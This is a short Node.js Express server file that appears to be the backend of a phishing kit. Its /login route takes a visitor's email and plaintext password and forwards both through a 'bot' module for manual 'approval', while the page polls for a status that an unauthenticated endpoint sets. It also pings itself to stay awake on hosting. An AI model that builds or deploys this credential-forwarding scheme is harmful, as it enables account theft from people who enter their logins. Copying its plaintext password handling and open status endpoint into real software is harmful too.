// ⛔ Pause the app early (must be before anything else)
if (process.env.BREAK_APP === 'true') {
  console.log("⛔ Service is paused via BREAK_APP. Exiting...");
  process.exit(1);
}

console.log("📦 Starting server.js...");

const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const path = require("path");
const fetch = require("node-fetch");
const { sendApprovalRequest } = require("./bot");

const app = express();
const PORT = process.env.PORT || 3000;

let pendingUsers = {};

app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static("public"));

// Health check
app.get("/", (req, res) => {
  res.send("✅ Server is running.");
});

// Handle login
app.post("/login", (req, res) => {
  const email = req.body.email.trim().toLowerCase();
  const password = req.body.password;

  pendingUsers[email] = { password, status: "pending" };
  console.log(`📥 Login: ${email}`);

  sendApprovalRequest(email, password);

  res.json({ success: true });
});

// Check approval status
app.get("/check-status", (req, res) => {
  const email = (req.query.email || "").trim().toLowerCase();

  if (!pendingUsers[email]) return res.json({ status: "unknown" });
  res.json({ status: pendingUsers[email].status });
});

// Update approval status
app.post("/update-status", (req, res) => {
  const email = (req.body.email || "").trim().toLowerCase();
  const status = req.body.status;

  console.log("📬 Update Status Received:", email, status);
  console.log("📌 All Users:", pendingUsers);

  if (pendingUsers[email]) {
    pendingUsers[email].status = status;
    console.log(`✅ Status updated for: ${email}`);
    return res.json({ ok: true });
  } else {
    console.log(`❌ User not found: ${email}`);
    return res.json({ ok: false, message: "User not found" });
  }
});

// Ping self every 30 seconds to stay awake
setInterval(() => {
  const url = `${process.env.APP_URL}`;
  fetch(url)
    .then(() => console.log("🔁 Pinged self to stay awake"))
    .catch(err => console.error("⚠️ Ping failed:", err));
}, 30 * 1000); // 30 seconds

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server running at http://localhost:${PORT}`);
});
